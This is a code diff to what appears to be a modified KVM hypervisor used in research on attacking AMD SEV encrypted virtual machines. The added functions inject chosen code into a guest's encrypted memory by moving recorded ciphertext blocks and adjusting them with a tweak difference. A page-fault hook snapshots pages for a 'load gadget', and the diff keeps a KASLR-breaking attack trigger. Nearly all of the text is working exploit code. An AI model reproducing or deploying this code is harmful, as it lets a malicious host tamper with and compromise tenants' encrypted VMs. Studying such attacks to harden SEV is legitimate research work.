@@ -57,6 +57,7 @@
 #include <linux/severed.h>
 #include <linux/types.h>
 
+extern load_gadget_t load_gadget;
 extern spinlock_t tracking_lock;
 int mmaps_before_reactivate = 0;
 DEFINE_SPINLOCK(capture_zero_page_lock);
@@ -66,7 +67,8 @@ DEFINE_SPINLOCK(kaslr_fault_counter_lock);
 bool kaslr_attacked = false;
 DEFINE_SPINLOCK(kaslr_attack_lock);
 
-#define OLD_SEV_VERSION
+//EDITME
+//#define OLD_SEV_VERSION
 
 /*
  * When setting this variable to true it enables Two-Dimensional-Paging
@@ -3890,9 +3892,232 @@ bool sev_handle_choose_random_location(struct kvm_vcpu *vcpu) {
   return true;
 }
 
-/*
- * Load vmlinuz code into database for cipher block move attacks
+bool simple_inject_code(struct kvm *kvm, inject_param_t *injp) {
+  return inject_code(kvm, injp->gpa, injp->injection_code_buffer, injp->length,
+                     injp->insert_at_back);
+}
+
+// TODO: choose better name and refactor if this works
+static bool __testversion_inject_code(struct kvm *kvm, gpa_t gpa_target,
+                                      uint8_t *code, uint64_t length,
+                                      bool insert_at_back, void *mapping,
+												  bool write_to_buffer) {
+  gpa_t gpa_move_source;
+  hpa_t hpa_move_source, hpa_target;
+  uint8_t *buffer, tweak_diff[CIPHER_BLOCK];
+  unsigned int prefix_offset;
+  int err;
+  err = 0;
+
+  if (length == 0) {
+    printk("Warning: inject_code was called with length  = 0\n");
+  }
+
+  err = get_hpa_for_gpa(kvm, gpa_target, &hpa_target);
+  if (err != 0) {
+    printk("in %s line %d: inject_code: converting gpa %016llx to hpa failed"
+           "with %d\n",
+           __FILE__, __LINE__, gpa_target, err);
+    return false;
+  }
+
+  // printk("inject_code: gpa_target = %016llx\t hpa_target = %016llx",
+  // gpa_target,
+  //      hpa_target);
+
+  if (insert_at_back) {
+    prefix_offset = CIPHER_BLOCK - length;
+  } else {
+    prefix_offset = 0;
+  }
+
+  if (0 != __find_source_for_move(hpa_target, code, length, prefix_offset,
+                                  &gpa_move_source, false)) {
+    printk("in %s line %d: inject_cocde: did not find any source for move\n",
+           __FILE__, __LINE__);
+    return false;
+  }
+
+  // If find_source_for_move returns gpa_source this conditions should be met.
+  // Just checking to catch bugs
+  BUG_ON(db_get(gpa_move_source) == NULL);
+  BUG_ON(!db_get(gpa_move_source)->hfn_valid);
+
+  // atomic because later on this code is used in pf handler
+  buffer = kmalloc(CIPHER_BLOCK, GFP_ATOMIC);
+  // get hpa by adding offset to hfn
+  hpa_move_source =
+      (db_get(gpa_move_source)->hfn << 12) + (gpa_move_source & 0xFFF);
+
+  // copy source ciphertext from db
+  memcpy(buffer,
+         db_get(gpa_move_source)->ciphertext + (gpa_move_source & 0xFFF),
+         CIPHER_BLOCK);
+  // printk("content of source buffer\n");
+  // print_blockwise(buffer, CIPHER_BLOCK);
+
+	  // if new sev, apply tweak diff before moving
+#ifndef OLD_SEV_VERSION
+	  calc_tweak(hpa_move_source ^ hpa_target, tweak_diff);
+	  xor_in_place(buffer, tweak_diff);
+#endif
+
+
+  //if true, mapping simply points to a buffer in memory that is used as
+  //a cache => just copy the data. If false, we really want to write data
+  //into VM memory
+  if(write_to_buffer ) {
+	  memcpy(mapping,buffer,CIPHER_BLOCK);
+  }
+  else {
+
+	  err = write_mapped(gpa_target, CIPHER_BLOCK, buffer, mapping);
+
+	  if (err != 0) {
+		 printk("in %s line %d read_physical failed with %d\n", __FILE__, __LINE__,
+				  err);
+		 goto finish;
+	  }
+
+  }
+
+finish:
+  kfree(buffer);
+
+  return err == 0;
+}
+
+/**
+ * Done inject into the VM memory. Instead write result into buffer so
+ * that we don't have to search the database if we want to inject it later
+ * on
  */
+bool nf_simple_inject_code_precalc(struct kvm *kvm, inject_param_t *injp,
+		void * buffer) {
+	return __testversion_inject_code(kvm,injp->gpa,injp->injection_code_buffer,
+			injp->length,injp->insert_at_back,buffer,true);
+}
+
+/**
+ * Inject into VM memory from Buffer instead of searching the database.
+ * injp : here only used for target gpa
+ * buffer : pre filled 16 byte array for injection instruction encoded in
+ * injp
+ */
+bool nf_buffered_inject(struct kvm* kvm, inject_param_t *injp,void *buffer,
+		void *mapping) {
+
+	int err;
+	uint64_t gpa_target;
+
+	gpa_target = injp->gpa;
+	err = write_mapped(gpa_target, CIPHER_BLOCK, buffer, mapping);
+
+	if (err != 0) {
+	 printk("in %s line %d read_physical failed with %d\n", __FILE__, __LINE__,
+			  err);
+	}
+
+	return (err == 0);
+}
+
+bool nf_simple_inject_code(struct kvm *kvm, inject_param_t *injp,
+                           void *mapping) {
+  return __testversion_inject_code(kvm, injp->gpa, injp->injection_code_buffer,
+                                   injp->length, injp->insert_at_back, mapping,false);
+}
+
+/**
+ * @insert_at_back: if true, we try to insert @code at the back of the 16 byte
+ * block, else at the front
+ */
+bool inject_code(struct kvm *kvm, gpa_t gpa_target, uint8_t *code,
+                 uint64_t length, bool insert_at_back) {
+
+  return __inject_code(kvm, gpa_target, code, length, insert_at_back, true);
+}
+
+bool __inject_code(struct kvm *kvm, gpa_t gpa_target, uint8_t *code,
+                   uint64_t length, bool insert_at_back, bool flush) {
+  gpa_t gpa_move_source;
+  hpa_t hpa_move_source, hpa_target;
+  uint8_t *buffer, tweak_diff[CIPHER_BLOCK];
+  unsigned int prefix_offset;
+  int err;
+  err = 0;
+
+  if (length == 0) {
+    printk("Warning: inject_code was called with length  = 0\n");
+  }
+
+  err = get_hpa_for_gpa(kvm, gpa_target, &hpa_target);
+  if (err != 0) {
+    printk("in %s line %d: inject_code: converting gpa %016llx to hpa failed"
+           "with %d\n",
+           __FILE__, __LINE__, gpa_target, err);
+    return false;
+  }
+
+  // printk("inject_code: gpa_target = %016llx\t hpa_target = %016llx",
+  // gpa_target,
+  //      hpa_target);
+
+  if (insert_at_back) {
+    prefix_offset = CIPHER_BLOCK - length;
+  } else {
+    prefix_offset = 0;
+  }
+
+  if (0 != __find_source_for_move(hpa_target, code, length, prefix_offset,
+                                  &gpa_move_source, false)) {
+    printk("in %s line %d: inject_cocde: did not find any source for move\n",
+           __FILE__, __LINE__);
+    return false;
+  }
+
+  // If find_source_for_move returns gpa_source this conditions should be met.
+  // Just checking to catch bugs
+  BUG_ON(db_get(gpa_move_source) == NULL);
+  BUG_ON(!db_get(gpa_move_source)->hfn_valid);
+
+  // atomic because later on this code is used in pf handler
+  buffer = kmalloc(CIPHER_BLOCK, GFP_ATOMIC);
+  // get hpa by adding offset to hfn
+  hpa_move_source =
+      (db_get(gpa_move_source)->hfn << 12) + (gpa_move_source & 0xFFF);
+
+  // copy source ciphertext from db
+  memcpy(buffer,
+         db_get(gpa_move_source)->ciphertext + (gpa_move_source & 0xFFF),
+         CIPHER_BLOCK);
+  // printk("content of source buffer\n");
+  // print_blockwise(buffer, CIPHER_BLOCK);
+
+  // if new sev, apply tweak diff before moving
+#ifndef OLD_SEV_VERSION
+  calc_tweak(hpa_move_source ^ hpa_target, tweak_diff);
+  xor_in_place(buffer, tweak_diff);
+#endif
+  if (flush) {
+    wbinvd();
+  }
+  err = write_physical(kvm, gpa_target, CIPHER_BLOCK, buffer, false);
+  if (flush) {
+    wbinvd();
+  }
+
+  if (err != 0) {
+    printk("in %s line %d read_physical failed with %d\n", __FILE__, __LINE__,
+           err);
+    goto finish;
+  }
+
+finish:
+  kfree(buffer);
+
+  return err == 0;
+}
+
 static bool handle_process_vmlinuz(struct kvm_vcpu *vcpu, uint64_t gpa) {
 
   int err;
@@ -3965,6 +4190,22 @@ static bool page_fault_handle_page_track(struct kvm_vcpu *vcpu, u32 error_code,
     return false;
   }
 
+  if (load_gadget.waiting_for_fault) {
+     printk("load gadget: Got fault at gpa %016llx gfn %016llx\n, with error_code & "
+            "PFERR_WRITE_MASK = "
+            "%08x",
+            gpa, gfn,error_code & PFERR_WRITE_MASK);
+
+	  printk("making snapshot of page before handling the page fault\n");
+     res = read_physical(vcpu->kvm, gpa  & ~0xfff, load_gadget.stack_page_pre_write, 4096,
+                          false);
+	  if( res != 0 ) {
+		  printk("failed to make snapshot of page before handle the page fault\n");
+	  }
+
+    __untrack_single_page(vcpu, gpa_to_gfn(gpa), KVM_PAGE_TRACK_WRITE);
+    load_gadget.tmp_fault_gpa = gpa;
+  }
 
   // handler for storing ciphertext of vmlinuz text section
 
@@ -3982,10 +4223,10 @@ static bool page_fault_handle_page_track(struct kvm_vcpu *vcpu, u32 error_code,
     }
   }
 
-  //EDITME: use one of the following code blocks depending on wheter
-  // sev is enabled or not
+  //EDITME: either use this or the commented code block depending on wheter
+  //you use sev or not
 
-  //Start of Code for KASLR attack with SEV enabled
+  // trigger kaslr attack
   if (gpa_to_gfn(gpa) ==
       (gpa_to_gfn(paddrVmlinuzTextSection) + PAGECOUNT_VMLINUZ - 1)) {
     spin_lock(&kaslr_attack_lock);
@@ -4005,7 +4246,6 @@ static bool page_fault_handle_page_track(struct kvm_vcpu *vcpu, u32 error_code,
     }
     spin_unlock(&kaslr_attack_lock);
   }
-  //End of Code for KASLR attack with SEV enabled
 
   // Start of Code for KASLR attack without SEV
   // loading vmlinuz is done at his point, execute move attack at kaslr
